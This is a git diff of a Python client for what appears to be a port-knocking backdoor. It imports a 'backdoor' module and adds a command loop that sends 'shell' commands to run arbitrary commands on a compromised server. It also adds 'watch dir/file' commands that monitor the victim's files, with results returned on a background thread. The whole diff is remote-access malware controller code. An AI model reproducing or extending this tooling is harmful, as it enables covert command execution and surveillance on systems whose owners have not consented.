@@ -1,3 +1,6 @@
+from __future__ import print_function
+from threading import Thread
+
 import argparse
 import backdoor
 import command
@@ -61,14 +64,35 @@ def main():
 
         client.connect()
 
-        #create thread for port knock
-        client.client_thread() 
+        # create thread for port knock
+        result_thread = Thread(target=client.listen_for_results)
+        result_thread.setDaemon(True)
+        result_thread.start()
 
         # read commands from the user until they exit
         while True:
+            cmd = None
             try:
                 cmd_str = raw_input("Enter a command to execute on the server: ")
-                cmd = command.ShellCommand(cmd_str)
+                if cmd_str.startswith("shell"):
+                    cmd = command.ShellCommand(cmd_str.split(" ", 1)[1])
+                elif cmd_str.startswith("watch"):
+                    try:
+                        _, watcharg, path = cmd_str.split(" ", 2)
+                        if watcharg == "dir":
+                            cmd = command.WatchCommand(path, command.WatchCommand.DIR)
+                        elif watcharg == "file":
+                            cmd = command.WatchCommand(path, command.WatchCommand.FILE)
+                    except:
+                        pass
+
+                    if not cmd:
+                        print("usage: watch {dir, file} path")
+                        continue
+                else:
+                    print("available commands: shell, watch")
+                    continue
+
             except (EOFError, KeyboardInterrupt):
                 print("Exiting...")
                 cmd = command.EndCommand()
@@ -77,9 +101,6 @@ def main():
 
             # No exception - try to have the server execute this
             client.send_command(cmd)
-            result = client.recv_result()
-            print("Received result:")
-            print(str(result))
 
 if __name__ == "__main__":
     main()
